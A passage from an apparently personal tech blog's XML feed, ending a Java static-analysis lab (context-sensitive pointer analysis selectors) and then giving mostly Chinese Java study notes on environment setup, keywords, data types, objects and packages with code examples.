class-name">Context</span> <span class="token function">selectContext</span><span class="token punctuation">(</span><span class="token class-name">CSCallSite</span> callSite<span class="token punctuation">,</span> <span class="token class-name">CSObj</span> recv<span class="token punctuation">,</span> <span class="token class-name">JMethod</span> callee<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token class-name">Context</span> oldContext <span class="token operator">=</span> recv<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>oldContext<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">ListContext</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span>oldContext<span class="token punctuation">.</span><span class="token function">getElementAt</span><span class="token punctuation">(</span>oldContext<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>recv<span class="token punctuation">.</span><span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContainerType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token class-name">ListContext</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span>recv<span class="token punctuation">.</span><span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContainerType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Context</span> <span class="token function">selectHeapContext</span><span class="token punctuation">(</span><span class="token class-name">CSMethod</span> method<span class="token punctuation">,</span> <span class="token class-name">Obj</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token class-name">Context</span> oldContext <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>oldContext<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">ListContext</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span>oldContext<span class="token punctuation">.</span><span class="token function">getElementAt</span><span class="token punctuation">(</span>oldContext<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> oldContext<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> Lab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Static-Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java</title>
      <link href="/2023/12/09/java/"/>
      <url>/2023/12/09/java/</url>
      
        <content type="html"><![CDATA[<h3id="setting-environment-variables-for-java-multi-version-environment">SettingEnvironment Variables for Java Multi-Version Environment</h3><ol type="1"><li>two version<imgsrc="https://s2.loli.net/2023/08/26/FtRSexfOpZHio53.png"alt="image-20230826155042290" /></li><li><code>CLASSPATH</code><imgsrc="https://s2.loli.net/2023/08/26/9Su6UwA4mcgKOM2.png"alt="image-20230826153319397" /></li><li>PATH<img src="https://s2.loli.net/2023/08/26/Q16tqrRjsydmK7M.png"alt="image-20230826153749469" /></li><li><strong>!important</strong>: this variable,Remove these three filesby changing the extension<imgsrc="https://s2.loli.net/2023/08/26/slGfmzx4guXJocU.png"alt="image-20230826155253241" /></li><li>result<imgsrc="C:/Users/22514/AppData/Roaming/Typora/typora-user-images/image-20230826155619662.png"alt="image-20230826155619662" /></li></ol><h3 id="哪些java知识不需要再学了">哪些Java知识不需要再学了</h3><ol type="1"><li>AWT 和 Swing</li><li>Applet</li><li>XML</li><li>JDBC：我个人不建议再学习偏<code>底层</code>的 JDBC了，尤其是对于时间宝贵的自学程序员来说。与其花这点时间，不如把精力投入到<code>MyBatis</code>的学习上。当然了，如果真的有时间，真的想打基础，研究一下也无可厚非</li><li>Struts</li><li>Hibernate：取而代之的是轻量级的 MyBatis</li><li>JSP：</li><li>servlet: JavaWeb 容器的基石，</li></ol><h3 id="java概述">Java概述</h3><ol type="1"><li><p>JVM、JRE、JDK 有什么关系:</p><p><code>JDK（Java Development Kit）</code>是用于开发 Java应用程序的软件环境。里面包含运行时环境（JRE）和其他 Java开发所需的工具，比如说解释器（java）、编译器（javac）、文档生成器（javadoc）等等。</p><p><code>JRE（Java Runtime Environment）</code>是用于运行 Java应用程序的软件环境。也就是说，如果只想运行 Java 程序而不需要开发 Java程序的话，只需要安装 JRE 就可以了。</p><p><code>JVM (Java Virtual Machine)</code> ，也就是 Java虚拟机，由一套字节码指令集、一组寄存器、一个栈、一个垃圾回收堆和一个存储方法域等组成，屏蔽了不同操作系统（macOS、Windows、Linux）的差异性，使得Java 能够“一次编译，到处运行</p></li></ol><h3 id="第一个程序">第一个程序</h3><ol type="1"><li>字节码由 JVM 逐条解释执行。</li><li>部分字节码可能由 <ahref="https://tobebetterjavaer.com/jvm/jit.html">JIT（即时编译，戳链接了解openin new window</a>）编译为机器指令直接执行。</li><li>Java 是解释和编译并存。</li></ol><h3 id="java关键字">Java关键字</h3><ol type="1"><li><p><code>extends</code></p></li><li><p><code>enum</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">PlayerType</span> <span class="token punctuation">&#123;</span>    <span class="token constant">TENNIS</span><span class="token punctuation">,</span>    <span class="token constant">FOOTBALL</span><span class="token punctuation">,</span>    <span class="token constant">BASKETBALL</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>final</code>:用于表示某个变量、方法或类是最终的，不能被修改或继承</p><ol type="1"><li><code>String</code> 类就是 final 的</li></ol></li><li><p><code>finally</code>: 和 try-catch配合使用，表示无论是否处理异常，总是执行 finally 块中的代码</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">10</span> <span class="token operator">/</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">// 抛出异常</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"发生了异常："</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"finally 块被执行"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>implements</code>： 实现接口</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyThread</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 线程执行的代码</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>instanceof</code>：用于判断对象是否属于某个类型（class）。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 例如，假设有一个 Person 类和一个 Student 类，Student 类继承自 Person 类，可以使用 instanceof 运算符来判断一个对象是否为 Person 类或其子类的实例：</span><span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token keyword">instanceof</span> <span class="token class-name">Person</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"p is an instance of Person"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token keyword">instanceof</span> <span class="token class-name">Student</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"p is an instance of Student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>interface</code></p></li><li><p><code>native</code>： 用于声明一个本地方法，本地方法是指在 Java代码中声明但在本地代码（通常是 C 或 C++代码）中实现的方法，它通常用于与<code>操作系统</code>或<code>其他本地库</code>进行交互。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">void</span> <span class="token function">nativeMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p><code>package</code>： 用于声明类所在的包。</p></li><li><p><code>private</code>：一个访问权限修饰符，表示方法或变量只对当前类可见。</p></li><li><p><code>protected</code>：一个访问权限修饰符，表示方法或变量对同一包内的类和所有子类可见</p></li><li><p><code>super</code>： 可用于调用父类的方法或者字段。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Animal</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">" is eating."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Dog</span> <span class="token keyword">extends</span> <span class="token class-name">Animal</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用父类的构造方法</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">bark</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">" is barking."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用父类的方法</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">" is eating bones."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>synchronized</code>：用于指定多线程代码中的同步方法、变量或者代码块</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyClass</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> count<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        count<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// 同步方法</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">synchronized</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 同步代码块</span>            <span class="token comment">// 执行一些需要同步的操作</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>this</code>：可用于在方法或构造方法中引用当前对象。</p></li><li><p><code>throw</code>： 主动抛出异常。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FileNotFoundException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p><code>throws</code>： 用于声明异常。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">readFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">FileNotFoundException</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>transient</code>： 修饰的字段不会被序列化。</p></li><li><p><code>try</code>： 用于包裹要捕获异常的代码块。</p></li><li><p><code>volatile</code>：保证不同线程对它修饰的变量进行操作时的可见性，即一个线程修改了某个变量的值，新值对其他线程来说是立即可见的。被标记为volatile，表示这个变量是共享的，可能会被多个线程同时访</p></li><li><p><code>const</code> 在 C语言中是声明常量的关键字，在 Java中可以使用 <code>public static final</code>三个关键字的组合来达到常量的效果。</p></li></ol><h3 id="注释">注释</h3><ol type="1"><li>在 Intellij IDEA 中，按下 <code>/*</code>后敲下回车键就可以自动添加文档注释的格式，<code>*/</code>是自动补全的</li><li>通过 <code>javadoc</code> 命令生成代码文档</li><li>文档注释中可以插入一些 <code>@</code> 注解，比如说 <code>@see</code>引用其他类，<code>@version</code> 版本号，<code>@param</code>参数标识符，<code>@author</code> 作者标识符，<code>@deprecated</code>已废弃标识符，等等</li><li>类、字段、方法必须使用<strong>文档注释</strong>，不能使用单行注释和多行注释。因为注释文档在IDE 编辑窗口中可以悬浮提示，提高编码效率。</li><li>所有的<ahref="https://tobebetterjavaer.com/oo/abstract.html">抽象方法open in newwindow</a>(包括接口中的方法)必须要用 Javadoc 注释、除了返回值、参数、异常说明外，还必须指出该方法做什么事情，实现什么功能。</li><li>所有的类都必须添加创建者和创建日期</li></ol><h3 id="java数据类型">Java数据类型</h3><ol type="1"><li><p>引用类型。常见的有<ahref="https://tobebetterjavaer.com/array/array.html">数组open in newwindow</a>（对，没错，数组是引用类型，后面我们会讲）、class（也就是<ahref="https://tobebetterjavaer.com/oo/object-class.html">类open in newwindow</a>），以及<ahref="https://tobebetterjavaer.com/oo/interface.html">接口open in newwindow</a>（指向的是实现接口的类的对象）。</p></li><li><p>当变量是<code>局部变量</code>的时候，必须得先初始化，否则编译器不允许你使用它</p></li><li><p>当变量是<code>成员变量</code>或者<code>静态变量</code>时，可以不进行初始化，它们会有一个默认值</p><table><thead><tr class="header"><th>数据类型</th><th>默认值</th><th>大小</th></tr></thead><tbody><tr class="odd"><td>boolean</td><td>false</td><td>1 比特</td></tr><tr class="even"><td>char</td><td>'000'</td><td>2 字节</td></tr><tr class="odd"><td>byte</td><td>0</td><td>1 字节</td></tr><tr class="even"><td>short</td><td>0</td><td>2 字节</td></tr><tr class="odd"><td>int</td><td>0</td><td>4 字节</td></tr><tr class="even"><td>long</td><td>0L</td><td>8 字节</td></tr><tr class="odd"><td>float</td><td>0.0f</td><td>4 字节</td></tr><tr class="even"><td>double</td><td>0.0</td><td>8 字节</td></tr></tbody></table></li><li><p>一个<code>英文字符</code>是一个字节，一个<code>中文字符</code>是两个字节</p></li><li><p>一个字节可以表示 2^8 = 256 个不同的值。由于 byte是有符号的，它的值可以是<code>负数</code>或<code>正数</code>， （-128 到127）</p></li><li><p>int 的取值范围在 -2,147,483,648（<code>-2 ^ 31</code>）和2,147,483,647（<code>2 ^ 31 -1</code>）</p></li><li><p>long 型变量在声明的时候，末尾要带上大写的“<strong>L</strong>”</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">long</span> l<span class="token punctuation">;</span> <span class="token comment">// 声明一个 long 类型变量</span>l <span class="token operator">=</span> <span class="token number">100000000000L</span><span class="token punctuation">;</span> <span class="token comment">// 将值 100000000000L 赋给变量 l（注意要加上 L 后缀）</span><span class="token keyword">long</span> m <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">20000000000L</span><span class="token punctuation">;</span> <span class="token comment">// 声明并初始化一个 long 类型变量 m，赋值为 -20000000000L</span></code></pre></li><li><p>float型变量在声明的时候，末尾要带上小写的“<strong>f</strong>”</p></li><li><p>字符字面量应该用单引号（''）包围，而不是双引号（""），因为<ahref="https://tobebetterjavaer.com/string/constant-pool.html">双引号表示字符串字面量openin new window</a>。</p></li><li><p>可以使用 int 的包装器类型 Integer 的 <code>toString()</code>方法+String 的 <code>charAt()</code> 方法转成 char。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> value_int <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">char</span> value_char <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>value_int<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>value_char <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>包装器类型</p><blockquote><ul><li>Byte（对应 byte）</li><li>Short（对应 short）</li><li>Integer（对应 int）</li><li>Long（对应 long）</li><li>Float（对应 float）</li><li>Double（对应 double）</li><li>Character（对应 char）</li><li>Boolean（对应 boolean）</li></ul></blockquote></li><li><p>使用包装器</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 使用 Integer 包装器类型</span><span class="token class-name">Integer</span> integerValue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"整数值: "</span> <span class="token operator">+</span> integerValue<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将字符串转换为整数</span><span class="token class-name">String</span> numberString <span class="token operator">=</span> <span class="token string">"123"</span><span class="token punctuation">;</span><span class="token keyword">int</span> parsedNumber <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>numberString<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"整数值: "</span> <span class="token operator">+</span> parsedNumber<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 使用 Character 包装器类型</span><span class="token class-name">Character</span> charValue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Character</span><span class="token punctuation">(</span><span class="token char">'A'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"字符: "</span> <span class="token operator">+</span> charValue<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 检查字符是否为数字</span><span class="token keyword">char</span> testChar <span class="token operator">=</span> <span class="token char">'9'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isDigit</span><span class="token punctuation">(</span>testChar<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"字符是个数字."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>对于接口类型的引用变量来说，你没法直接 new 一个：只能 new一个实现它的类的对象</p></li><li><p>引用数据类型：</p><ul><li>1、变量名指向的是存储对象的内存地址，在栈上。</li><li>2、内存地址指向的对象存储在堆上</li></ul></li><li><p><code>栈</code>，能够和处理器（CPU，也就是脑子）直接关联，因此访问速度更快</p></li><li><p>这段代码会先在堆里创建一个沉默王二的字符串对象，然后再把对象的引用 a放到栈里面。这里面还会涉及到<ahref="https://tobebetterjavaer.com/string/constant-pool.html">字符串常量池openin new window</a>，</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"沉默王二"</span><span class="token punctuation">)</span></code></pre><ol type="1"><li><p>example</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> y <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token class-name">Object</span> o1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>picture:<img src="https://s2.loli.net/2023/09/03/D9FEJozZNGm41hV.png"alt="basic-data-type-3d5b3e40-1abb-4624-8282-b83e58388825" /></p></li></ol></li></ol><h3 id="面向对象">面向对象</h3><ol type="1"><li><p>面向对象是模块化的，面向对象的<code>底层</code>其实还是面向过程，只不过把面向过程进行了<code>抽象化</code>，封装成了类，方便我们的调用。</p></li><li><p>在类内部但在方法外部，方法内部的叫<code>临时变量</code>。</p></li><li><p>成员变量有时候也叫做实例变量，在<code>编译</code>时不占用内存空间，在<code>运行</code>时获取内存，也就是说，只有在对象实例化（<code>new Person()</code>）后，字段才会获取到内存，这也正是它被称作“实例”变量的原因。</p></li><li><p>创建对象的时候，需要一个 <code>main()</code> 方法作为入口，<code>main()</code> 方法可以在当前类中，也可以在另外一个类中。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> sex<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">dadoudou</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Person</span> person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span>sex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>实际开发中，我们通常不在当前类中直接创建对象并使用它，而是放在<strong>使用对象</strong>的类中</p><ol type="1"><li>person 被称为对象 Person 的<code>引用变量</code></li></ol></li><li><p><code>匿名对象</code>。匿名对象意味着没有引用变量，它只能在创建的时候被使用一次。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token string">"沉默王二"</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>还有一种“<code>默认</code>”的权限修饰符，是缺省的，它修饰的类可以访问同一个包下面的其他类</p></li></ol><h3 id="包">包</h3><ol type="1"><li><p>使用<code>package</code>来解决名字冲突。</p></li><li><p>包没有<code>父子关系</code>。java.util和java.util.zip是不同的包，两者没有任何继承关系。</p></li><li><p>没有定义包名的<code>class</code>，它使用的是默认包</p></li><li><p>位于同一个包的类，可以访问包作用域的<strong>字段和方法</strong>。，不用<code>public</code>、<code>protected</code>、<code>private</code>修饰的字段和方法就是包作用域</p></li><li><p>引用小军的<code>mr.jun.Arrays</code>类</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 1</span><span class="token class-name"><span class="token namespace">mr<span class="token punctuation">.</span>jun<span class="token punctuation">.</span></span>Arrays</span> arrays <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">mr<span class="token punctuation">.</span>jun<span class="token punctuation">.</span></span>Arrays</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 2</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">mr<span class="token punctuation">.</span>jun<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Arrays</span> arrays <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Arrays</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 3</span><span class="token comment">// 导入mr.jun包的所有class:</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">mr<span class="token punctuation">.</span>jun<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Arrays</span> arrays <span class="token 